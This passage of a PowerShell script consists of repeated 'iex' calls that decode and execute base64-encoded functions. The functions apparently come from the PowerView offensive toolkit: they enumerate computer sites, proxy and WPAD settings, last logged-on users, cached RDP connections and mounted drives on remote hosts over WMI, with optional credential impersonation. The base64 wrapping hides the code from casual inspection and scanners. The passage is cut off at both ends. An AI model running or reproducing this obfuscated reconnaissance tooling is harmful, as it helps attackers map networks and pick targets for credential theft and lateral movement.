1pbicgJEZhbHNlCiAgICAgICAgICAgIH0KICAgICAgICAgICAgJElzQWRtaW4uUFNPYmplY3QuVHlwZU5hbWVzLkluc2VydCgwLCAnUG93ZXJWaWV3LkFkbWluQWNjZXNzJykKICAgICAgICAgICAgJElzQWRtaW4KICAgICAgICB9CiAgICB9CiAgICBFTkQgewogICAgICAgIGlmICgkTG9nb25Ub2tlbikgewogICAgICAgICAgICBJbnZva2UtUmV2ZXJ0VG9TZWxmIC1Ub2tlbkhhbmRsZSAkTG9nb25Ub2tlbgogICAgICAgIH0KICAgIH0KfQo=")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LU5ldENvbXB1dGVyU2l0ZU5hbWUgewogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5Db21wdXRlclNpdGUnKV0KICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ0hvc3ROYW1lJywgJ2Ruc2hvc3RuYW1lJywgJ25hbWUnKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkQ29tcHV0ZXJOYW1lID0gJ2xvY2FsaG9zdCcsCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5CiAgICApCiAgICBCRUdJTiB7CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7CiAgICAgICAgICAgICRMb2dvblRva2VuID0gSW52b2tlLVVzZXJJbXBlcnNvbmF0aW9uIC1DcmVkZW50aWFsICRDcmVkZW50aWFsCiAgICAgICAgfQogICAgfQogICAgUFJPQ0VTUyB7CiAgICAgICAgRm9yRWFjaCAoJENvbXB1dGVyIGluICRDb21wdXRlck5hbWUpIHsKICAgICAgICAgICAgaWYgKCRDb21wdXRlciAtbWF0Y2ggJ14oPzpbMC05XXsxLDN9XC4pezN9WzAtOV17MSwzfSQnKSB7CiAgICAgICAgICAgICAgICAkSVBBZGRyZXNzID0gJENvbXB1dGVyCiAgICAgICAgICAgICAgICAkQ29tcHV0ZXIgPSBbU3lzdGVtLk5ldC5EbnNdOjpHZXRIb3N0QnlBZGRyZXNzKCRDb21wdXRlcikgfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSBIb3N0TmFtZQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgJElQQWRkcmVzcyA9IEAoUmVzb2x2ZS1JUEFkZHJlc3MgLUNvbXB1dGVyTmFtZSAkQ29tcHV0ZXIpWzBdLklQQWRkcmVzcwogICAgICAgICAgICB9CiAgICAgICAgICAgICRQdHJJbmZvID0gW0ludFB0cl06Olplcm8KICAgICAgICAgICAgJFJlc3VsdCA9ICROZXRhcGkzMjo6RHNHZXRTaXRlTmFtZSgkQ29tcHV0ZXIsIFtyZWZdJFB0ckluZm8pCiAgICAgICAgICAgICRDb21wdXRlclNpdGUgPSBOZXctT2JqZWN0IFBTT2JqZWN0CiAgICAgICAgICAgICRDb21wdXRlclNpdGUgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnQ29tcHV0ZXJOYW1lJyAkQ29tcHV0ZXIKICAgICAgICAgICAgJENvbXB1dGVyU2l0ZSB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdJUEFkZHJlc3MnICRJUEFkZHJlc3MKICAgICAgICAgICAgaWYgKCRSZXN1bHQgLWVxIDApIHsKICAgICAgICAgICAgICAgICRTaXRlbmFtZSA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlB0clRvU3RyaW5nQXV0bygkUHRySW5mbykKICAgICAgICAgICAgICAgICRDb21wdXRlclNpdGUgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnU2l0ZU5hbWUnICRTaXRlbmFtZQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1OZXRDb21wdXRlclNpdGVOYW1lXSBFcnJvcjogJCgoW0NvbXBvbmVudE1vZGVsLldpbjMyRXhjZXB0aW9uXSAkUmVzdWx0KS5NZXNzYWdlKSIKICAgICAgICAgICAgICAgICRDb21wdXRlclNpdGUgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnU2l0ZU5hbWUnICcnCiAgICAgICAgICAgIH0KICAgICAgICAgICAgJENvbXB1dGVyU2l0ZS5QU09iamVjdC5UeXBlTmFtZXMuSW5zZXJ0KDAsICdQb3dlclZpZXcuQ29tcHV0ZXJTaXRlJykKICAgICAgICAgICAgJE51bGwgPSAkTmV0YXBpMzI6Ok5ldEFwaUJ1ZmZlckZyZWUoJFB0ckluZm8pCiAgICAgICAgICAgICRDb21wdXRlclNpdGUKICAgICAgICB9CiAgICB9CiAgICBFTkQgewogICAgICAgIGlmICgkTG9nb25Ub2tlbikgewogICAgICAgICAgICBJbnZva2UtUmV2ZXJ0VG9TZWxmIC1Ub2tlbkhhbmRsZSAkTG9nb25Ub2tlbgogICAgICAgIH0KICAgIH0KfQo=")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LVdNSVJlZ1Byb3h5IHsKICAgIFtPdXRwdXRUeXBlKCdQb3dlclZpZXcuUHJveHlTZXR0aW5ncycpXQogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUpXQogICAgICAgIFtBbGlhcygnSG9zdE5hbWUnLCAnZG5zaG9zdG5hbWUnLCAnbmFtZScpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRDb21wdXRlck5hbWUgPSAkRW52OkNPTVBVVEVSTkFNRSwKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkKICAgICkKICAgIFBST0NFU1MgewogICAgICAgIEZvckVhY2ggKCRDb21wdXRlciBpbiAkQ29tcHV0ZXJOYW1lKSB7CiAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAkV21pQXJndW1lbnRzID0gQHsKICAgICAgICAgICAgICAgICAgICAnTGlzdCcgPSAkVHJ1ZQogICAgICAgICAgICAgICAgICAgICdDbGFzcycgPSAnU3RkUmVnUHJvdicKICAgICAgICAgICAgICAgICAgICAnTmFtZXNwYWNlJyA9ICdyb290XGRlZmF1bHQnCiAgICAgICAgICAgICAgICAgICAgJ0NvbXB1dGVybmFtZScgPSAkQ29tcHV0ZXIKICAgICAgICAgICAgICAgICAgICAnRXJyb3JBY3Rpb24nID0gJ1N0b3AnCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJFdtaUFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQogICAgICAgICAgICAgICAgJFJlZ1Byb3ZpZGVyID0gR2V0LVdtaU9iamVjdCBAV21pQXJndW1lbnRzCiAgICAgICAgICAgICAgICAkS2V5ID0gJ1NPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXEludGVybmV0IFNldHRpbmdzJwogICAgICAgICAgICAgICAgJEhLQ1UgPSAyMTQ3NDgzNjQ5CiAgICAgICAgICAgICAgICAkUHJveHlTZXJ2ZXIgPSAkUmVnUHJvdmlkZXIuR2V0U3RyaW5nVmFsdWUoJEhLQ1UsICRLZXksICdQcm94eVNlcnZlcicpLnNWYWx1ZQogICAgICAgICAgICAgICAgJEF1dG9Db25maWdVUkwgPSAkUmVnUHJvdmlkZXIuR2V0U3RyaW5nVmFsdWUoJEhLQ1UsICRLZXksICdBdXRvQ29uZmlnVVJMJykuc1ZhbHVlCiAgICAgICAgICAgICAgICAkV3BhZCA9ICcnCiAgICAgICAgICAgICAgICBpZiAoJEF1dG9Db25maWdVUkwgLWFuZCAoJEF1dG9Db25maWdVUkwgLW5lICcnKSkgewogICAgICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRXcGFkID0gKE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJEF1dG9Db25maWdVUkwpCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiW0dldC1XTUlSZWdQcm94eV0gRXJyb3IgY29ubmVjdGluZyB0byBBdXRvQ29uZmlnVVJMIDogJEF1dG9Db25maWdVUkwiCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgaWYgKCRQcm94eVNlcnZlciAtb3IgJEF1dG9Db25maWdVcmwpIHsKICAgICAgICAgICAgICAgICAgICAkT3V0ID0gTmV3LU9iamVjdCBQU09iamVjdAogICAgICAgICAgICAgICAgICAgICRPdXQgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnQ29tcHV0ZXJOYW1lJyAkQ29tcHV0ZXIKICAgICAgICAgICAgICAgICAgICAkT3V0IHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1Byb3h5U2VydmVyJyAkUHJveHlTZXJ2ZXIKICAgICAgICAgICAgICAgICAgICAkT3V0IHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0F1dG9Db25maWdVUkwnICRBdXRvQ29uZmlnVVJMCiAgICAgICAgICAgICAgICAgICAgJE91dCB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdXcGFkJyAkV3BhZAogICAgICAgICAgICAgICAgICAgICRPdXQuUFNPYmplY3QuVHlwZU5hbWVzLkluc2VydCgwLCAnUG93ZXJWaWV3LlByb3h5U2V0dGluZ3MnKQogICAgICAgICAgICAgICAgICAgICRPdXQKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIltHZXQtV01JUmVnUHJveHldIE5vIHByb3h5IHNldHRpbmdzIGZvdW5kIGZvciAkQ29tcHV0ZXJOYW1lIgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIltHZXQtV01JUmVnUHJveHldIEVycm9yIGVudW1lcmF0aW5nIHByb3h5IHNldHRpbmdzIGZvciAkQ29tcHV0ZXJOYW1lIDogJF8iCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9Cn0K")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LVdNSVJlZ0xhc3RMb2dnZWRPbiB7CiAgICBbT3V0cHV0VHlwZSgnUG93ZXJWaWV3Lkxhc3RMb2dnZWRPblVzZXInKV0KICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ0hvc3ROYW1lJywgJ2Ruc2hvc3RuYW1lJywgJ25hbWUnKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmdbXV0KICAgICAgICAkQ29tcHV0ZXJOYW1lID0gJ2xvY2FsaG9zdCcsCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdCiAgICAgICAgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5DcmVkZW50aWFsQXR0cmlidXRlKCldCiAgICAgICAgJENyZWRlbnRpYWwgPSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF06OkVtcHR5CiAgICApCiAgICBQUk9DRVNTIHsKICAgICAgICBGb3JFYWNoICgkQ29tcHV0ZXIgaW4gJENvbXB1dGVyTmFtZSkgewogICAgICAgICAgICAkSEtMTSA9IDIxNDc0ODM2NTAKICAgICAgICAgICAgJFdtaUFyZ3VtZW50cyA9IEB7CiAgICAgICAgICAgICAgICAnTGlzdCcgPSAkVHJ1ZQogICAgICAgICAgICAgICAgJ0NsYXNzJyA9ICdTdGRSZWdQcm92JwogICAgICAgICAgICAgICAgJ05hbWVzcGFjZScgPSAncm9vdFxkZWZhdWx0JwogICAgICAgICAgICAgICAgJ0NvbXB1dGVybmFtZScgPSAkQ29tcHV0ZXIKICAgICAgICAgICAgICAgICdFcnJvckFjdGlvbicgPSAnU2lsZW50bHlDb250aW51ZScKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJFdtaUFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgJFJlZyA9IEdldC1XbWlPYmplY3QgQFdtaUFyZ3VtZW50cwogICAgICAgICAgICAgICAgJEtleSA9ICdTT0ZUV0FSRVxNaWNyb3NvZnRcV2luZG93c1xDdXJyZW50VmVyc2lvblxBdXRoZW50aWNhdGlvblxMb2dvblVJJwogICAgICAgICAgICAgICAgJFZhbHVlID0gJ0xhc3RMb2dnZWRPblVzZXInCiAgICAgICAgICAgICAgICAkTGFzdFVzZXIgPSAkUmVnLkdldFN0cmluZ1ZhbHVlKCRIS0xNLCAkS2V5LCAkVmFsdWUpLnNWYWx1ZQogICAgICAgICAgICAgICAgJExhc3RMb2dnZWRPbiA9IE5ldy1PYmplY3QgUFNPYmplY3QKICAgICAgICAgICAgICAgICRMYXN0TG9nZ2VkT24gfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnQ29tcHV0ZXJOYW1lJyAkQ29tcHV0ZXIKICAgICAgICAgICAgICAgICRMYXN0TG9nZ2VkT24gfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnTGFzdExvZ2dlZE9uJyAkTGFzdFVzZXIKICAgICAgICAgICAgICAgICRMYXN0TG9nZ2VkT24uUFNPYmplY3QuVHlwZU5hbWVzLkluc2VydCgwLCAnUG93ZXJWaWV3Lkxhc3RMb2dnZWRPblVzZXInKQogICAgICAgICAgICAgICAgJExhc3RMb2dnZWRPbgogICAgICAgICAgICB9CiAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIltHZXQtV01JUmVnTGFzdExvZ2dlZE9uXSBFcnJvciBvcGVuaW5nIHJlbW90ZSByZWdpc3RyeSBvbiAkQ29tcHV0ZXIuIFJlbW90ZSByZWdpc3RyeSBsaWtlbHkgbm90IGVuYWJsZWQuIgogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQp9Cg==")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LVdNSVJlZ0NhY2hlZFJEUENvbm5lY3Rpb24gewogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5DYWNoZWRSRFBDb25uZWN0aW9uJyldCiAgICBbQ21kbGV0QmluZGluZygpXQogICAgUGFyYW0oCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDAsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW0FsaWFzKCdIb3N0TmFtZScsICdkbnNob3N0bmFtZScsICduYW1lJyldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJENvbXB1dGVyTmFtZSA9ICdsb2NhbGhvc3QnLAogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eQogICAgKQogICAgUFJPQ0VTUyB7CiAgICAgICAgRm9yRWFjaCAoJENvbXB1dGVyIGluICRDb21wdXRlck5hbWUpIHsKICAgICAgICAgICAgJEhLVSA9IDIxNDc0ODM2NTEKICAgICAgICAgICAgJFdtaUFyZ3VtZW50cyA9IEB7CiAgICAgICAgICAgICAgICAnTGlzdCcgPSAkVHJ1ZQogICAgICAgICAgICAgICAgJ0NsYXNzJyA9ICdTdGRSZWdQcm92JwogICAgICAgICAgICAgICAgJ05hbWVzcGFjZScgPSAncm9vdFxkZWZhdWx0JwogICAgICAgICAgICAgICAgJ0NvbXB1dGVybmFtZScgPSAkQ29tcHV0ZXIKICAgICAgICAgICAgICAgICdFcnJvckFjdGlvbicgPSAnU3RvcCcKICAgICAgICAgICAgfQogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJFdtaUFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQogICAgICAgICAgICB0cnkgewogICAgICAgICAgICAgICAgJFJlZyA9IEdldC1XbWlPYmplY3QgQFdtaUFyZ3VtZW50cwogICAgICAgICAgICAgICAgJFVzZXJTSURzID0gKCRSZWcuRW51bUtleSgkSEtVLCAnJykpLnNOYW1lcyB8IFdoZXJlLU9iamVjdCB7ICRfIC1tYXRjaCAnUy0xLTUtMjEtWzAtOV0rLVswLTldKy1bMC05XSstWzAtOV0rJCcgfQogICAgICAgICAgICAgICAgRm9yRWFjaCAoJFVzZXJTSUQgaW4gJFVzZXJTSURzKSB7CiAgICAgICAgICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkVXNlck5hbWUgPSBDb252ZXJ0RnJvbS1TSUQgLU9iamVjdFNpZCAkVXNlclNJRCAtQ3JlZGVudGlhbCAkQ3JlZGVudGlhbAogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFVzZXJOYW1lID0gQ29udmVydEZyb20tU0lEIC1PYmplY3RTaWQgJFVzZXJTSUQKICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAkQ29ubmVjdGlvbktleXMgPSAkUmVnLkVudW1WYWx1ZXMoJEhLVSwiJFVzZXJTSURcU29mdHdhcmVcTWljcm9zb2Z0XFRlcm1pbmFsIFNlcnZlciBDbGllbnRcRGVmYXVsdCIpLnNOYW1lcwogICAgICAgICAgICAgICAgICAgICAgICBGb3JFYWNoICgkQ29ubmVjdGlvbiBpbiAkQ29ubmVjdGlvbktleXMpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkQ29ubmVjdGlvbiAtbWF0Y2ggJ01SVS4qJykgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRUYXJnZXRTZXJ2ZXIgPSAkUmVnLkdldFN0cmluZ1ZhbHVlKCRIS1UsICIkVXNlclNJRFxTb2Z0d2FyZVxNaWNyb3NvZnRcVGVybWluYWwgU2VydmVyIENsaWVudFxEZWZhdWx0IiwgJENvbm5lY3Rpb24pLnNWYWx1ZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRGb3VuZENvbm5lY3Rpb24gPSBOZXctT2JqZWN0IFBTT2JqZWN0CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgJEZvdW5kQ29ubmVjdGlvbiB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdDb21wdXRlck5hbWUnICRDb21wdXRlcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRGb3VuZENvbm5lY3Rpb24gfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnVXNlck5hbWUnICRVc2VyTmFtZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRGb3VuZENvbm5lY3Rpb24gfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnVXNlclNJRCcgJFVzZXJTSUQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkRm91bmRDb25uZWN0aW9uIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1RhcmdldFNlcnZlcicgJFRhcmdldFNlcnZlcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRGb3VuZENvbm5lY3Rpb24gfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnVXNlcm5hbWVIaW50JyAkTnVsbAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRGb3VuZENvbm5lY3Rpb24uUFNPYmplY3QuVHlwZU5hbWVzLkluc2VydCgwLCAnUG93ZXJWaWV3LkNhY2hlZFJEUENvbm5lY3Rpb24nKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICRGb3VuZENvbm5lY3Rpb24KICAgICAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAkU2VydmVyS2V5cyA9ICRSZWcuRW51bUtleSgkSEtVLCIkVXNlclNJRFxTb2Z0d2FyZVxNaWNyb3NvZnRcVGVybWluYWwgU2VydmVyIENsaWVudFxTZXJ2ZXJzIikuc05hbWVzCiAgICAgICAgICAgICAgICAgICAgICAgIEZvckVhY2ggKCRTZXJ2ZXIgaW4gJFNlcnZlcktleXMpIHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRVc2VybmFtZUhpbnQgPSAkUmVnLkdldFN0cmluZ1ZhbHVlKCRIS1UsICIkVXNlclNJRFxTb2Z0d2FyZVxNaWNyb3NvZnRcVGVybWluYWwgU2VydmVyIENsaWVudFxTZXJ2ZXJzXCRTZXJ2ZXIiLCAnVXNlcm5hbWVIaW50Jykuc1ZhbHVlCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkRm91bmRDb25uZWN0aW9uID0gTmV3LU9iamVjdCBQU09iamVjdAogICAgICAgICAgICAgICAgICAgICAgICAgICAgJEZvdW5kQ29ubmVjdGlvbiB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdDb21wdXRlck5hbWUnICRDb21wdXRlcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgJEZvdW5kQ29ubmVjdGlvbiB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdVc2VyTmFtZScgJFVzZXJOYW1lCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkRm91bmRDb25uZWN0aW9uIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1VzZXJTSUQnICRVc2VyU0lECiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkRm91bmRDb25uZWN0aW9uIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ1RhcmdldFNlcnZlcicgJFNlcnZlcgogICAgICAgICAgICAgICAgICAgICAgICAgICAgJEZvdW5kQ29ubmVjdGlvbiB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdVc2VybmFtZUhpbnQnICRVc2VybmFtZUhpbnQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICRGb3VuZENvbm5lY3Rpb24uUFNPYmplY3QuVHlwZU5hbWVzLkluc2VydCgwLCAnUG93ZXJWaWV3LkNhY2hlZFJEUENvbm5lY3Rpb24nKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgJEZvdW5kQ29ubmVjdGlvbgogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1XTUlSZWdDYWNoZWRSRFBDb25uZWN0aW9uXSBFcnJvcjogJF8iCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGNhdGNoIHsKICAgICAgICAgICAgICAgIFdyaXRlLVdhcm5pbmcgIltHZXQtV01JUmVnQ2FjaGVkUkRQQ29ubmVjdGlvbl0gRXJyb3IgYWNjZXNzaW5nICRDb21wdXRlciwgbGlrZWx5IGluc3VmZmljaWVudCBwZXJtaXNzaW9ucyBvciBmaXJld2FsbCBydWxlcyBvbiBob3N0OiAkXyIKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQo=")))

iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("ZnVuY3Rpb24gR2V0LVdNSVJlZ01vdW50ZWREcml2ZSB7CiAgICBbT3V0cHV0VHlwZSgnUG93ZXJWaWV3LlJlZ01vdW50ZWREcml2ZScpXQogICAgW0NtZGxldEJpbmRpbmcoKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBWYWx1ZUZyb21QaXBlbGluZSA9ICRUcnVlLCBWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUpXQogICAgICAgIFtBbGlhcygnSG9zdE5hbWUnLCAnZG5zaG9zdG5hbWUnLCAnbmFtZScpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRDb21wdXRlck5hbWUgPSAnbG9jYWxob3N0JywKICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0KICAgICAgICBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLkNyZWRlbnRpYWxBdHRyaWJ1dGUoKV0KICAgICAgICAkQ3JlZGVudGlhbCA9IFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXTo6RW1wdHkKICAgICkKICAgIFBST0NFU1MgewogICAgICAgIEZvckVhY2ggKCRDb21wdXRlciBpbiAkQ29tcHV0ZXJOYW1lKSB7CiAgICAgICAgICAgICRIS1UgPSAyMTQ3NDgzNjUxCiAgICAgICAgICAgICRXbWlBcmd1bWVudHMgPSBAewogICAgICAgICAgICAgICAgJ0xpc3QnID0gJFRydWUKICAgICAgICAgICAgICAgICdDbGFzcycgPSAnU3RkUmVnUHJvdicKICAgICAgICAgICAgICAgICdOYW1lc3BhY2UnID0gJ3Jvb3RcZGVmYXVsdCcKICAgICAgICAgICAgICAgICdDb21wdXRlcm5hbWUnID0gJENvbXB1dGVyCiAgICAgICAgICAgICAgICAnRXJyb3JBY3Rpb24nID0gJ1N0b3AnCiAgICAgICAgICAgIH0KICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRXbWlBcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgICRSZWcgPSBHZXQtV21pT2JqZWN0IEBXbWlBcmd1bWVudHMKICAgICAgICAgICAgICAgICRVc2VyU0lEcyA9ICgkUmVnLkVudW1LZXkoJEhLVSwgJycpKS5zTmFtZXMgfCBXaGVyZS1PYmplY3QgeyAkXyAtbWF0Y2ggJ1MtMS01LTIxLVswLTldKy1bMC05XSstWzAtOV0rLVswLTldKyQnIH0KICAgICAgICAgICAgICAgIEZvckVhY2ggKCRVc2VyU0lEIGluICRVc2VyU0lEcykgewogICAgICAgICAgICAgICAgICAgIHRyeSB7CiAgICAgICAgICAgICAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgJFVzZXJOYW1l